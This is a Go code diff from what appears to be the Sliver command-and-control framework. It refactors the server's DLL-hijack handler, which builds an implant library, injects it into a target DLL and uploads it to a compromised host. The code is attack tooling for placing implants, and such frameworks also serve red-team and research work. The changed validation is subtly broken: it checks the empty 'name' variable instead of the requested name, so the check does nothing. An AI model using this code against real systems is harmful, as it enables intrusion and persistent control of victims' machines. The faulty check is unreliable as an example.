@@ -24,7 +24,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"io/ioutil"
+	"os"
 	"strings"
 
 	"github.com/Binject/debug/pe"
@@ -34,8 +34,11 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/generate"
+	"github.com/bishopfox/sliver/util"
 	"github.com/bishopfox/sliver/util/encoders"
 )
 
@@ -44,6 +47,7 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 	var (
 		refDLL        []byte
 		targetDLLData []byte
+		name          string
 	)
 	resp := &clientpb.DllHijack{
 		Response: &commonpb.Response{},
@@ -105,19 +109,34 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 			)
 		}
 
-		name, config := generate.ImplantConfigFromProtobuf(p.Config)
-		if name == "" {
-			name, err = generate.GetCodename()
+		config := p.Config
+		if req.Name == "" {
+			name, err = codenames.GetCodename()
 			if err != nil {
 				return nil, err
 			}
+		} else if err := util.AllowedName(name); err != nil {
+			return nil, err
+		} else {
+			name = req.Name
 		}
-		fPath, err := generate.SliverSharedLibrary(name, config)
+		build, err := generate.GenerateConfig(name, config)
+		if err != nil {
+			return nil, err
+		}
+		// retrieve http c2 implant config
+		httpC2Config, err := db.LoadHTTPC2ConfigByName(p.Config.HTTPC2ConfigName)
 		if err != nil {
 			return nil, err
 		}
 
-		targetDLLData, err = ioutil.ReadFile(fPath)
+		fPath, err := generate.SliverSharedLibrary(name, build, config, httpC2Config.ImplantConfig)
+
+		if err != nil {
+			return nil, err
+		}
+
+		targetDLLData, err = os.ReadFile(fPath)
 		if err != nil {
 			return nil, err
 		}
@@ -137,7 +156,7 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 		return resp, fmt.Errorf("failed to convert PE to bytes: %s", err)
 	}
 	// upload new dll
-	uploadGzip := new(encoders.Gzip).Encode(targetBytes)
+	uploadGzip, _ := new(encoders.Gzip).Encode(targetBytes)
 	// upload to remote target
 	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
 		Encoder: "gzip",
